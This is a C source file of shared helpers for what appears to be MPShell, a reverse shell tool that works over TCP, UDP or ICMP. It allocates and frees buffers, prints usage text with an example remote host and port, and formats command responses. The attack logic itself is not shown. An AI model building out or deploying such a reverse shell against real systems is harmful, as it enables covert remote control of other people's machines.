#include "mpshell-common.h"

mp_command_buffer *command_buffer       = NULL;
mp_result_buffer *result_buffer         = NULL;
unsigned char *packet_in                = NULL;
unsigned char *packet_out               = NULL;

void init_buffers(void)
{
    command_buffer                      = (mp_command_buffer *) calloc(1, sizeof(mp_command_buffer));
    command_buffer->data                = (unsigned char *) malloc(MAX_COMMAND_SIZE);
    command_buffer->num_bytes_allocated = MAX_COMMAND_SIZE;

    result_buffer                       = (mp_result_buffer *) calloc(1, sizeof(mp_result_buffer));
    result_buffer->data                 = (unsigned char *) malloc(INITIAL_MALLOC_SIZE);
    result_buffer->num_bytes_allocated  = INITIAL_MALLOC_SIZE;

    packet_in   = (unsigned char *) calloc(1, MAX_PACKET_SIZE);
    packet_out  = (unsigned char *) calloc(1, MAX_PACKET_SIZE);
}

void cleanup(void)
{
    if (command_buffer != NULL && command_buffer->data != NULL)
        free(command_buffer->data);
    if (result_buffer != NULL && result_buffer->data != NULL)
        free(result_buffer->data);

    free(command_buffer);
    free(result_buffer);
    free(packet_in);
    free(packet_out);
}

void show_usage(bool windows)
{
    const char *additional_notes = "\n" \
    "Note that --payload-size, --sleep and --timeout options are only used for UDP/ICMP.\n" \
    "--payload-size option doesn't include protocol (UDP|ICMP) header, or a reverse shell\n" \
    "payload header of 10 bytes.\n\n";

    if (windows)
        printf("\nUSAGE: .\\MPShell.exe --host=192.68.0.13 --port=8080 [OPTIONS]\n\n");
    else
        printf("\nUSAGE: ./MPShell --host=192.68.0.13 --port=8080 [OPTIONS]\n\n");

    printf("Options:\n");
    printf("-------\n");
    printf("--protocol=tcp|udp|icmp\n");
    printf("%-40s%s\n", "--payload-size=1462",  "[bytes]");
    printf("%-40s%s\n", "--sleep=100",          "[milliseconds]");
    printf("%-40s%s\n", "--timeout=2",          "[seconds]");
    printf("%s", additional_notes);
    exit(EXIT_FAILURE);
}

void prepare_ok_response(void)
{
    const char *empty_response = "OK";
    memcpy(&result_buffer->data[result_buffer->num_bytes_occupied], empty_response, strlen(empty_response)+1);
    result_buffer->num_bytes_occupied = 3;
}

void prepare_error_response(void)
{
    const char *error_message = "[ERROR] => Could not execute command!";
    memcpy(&result_buffer->data[result_buffer->num_bytes_occupied], error_message, strlen(error_message)+1);
    result_buffer->num_bytes_occupied += (strlen(error_message)+1);
}
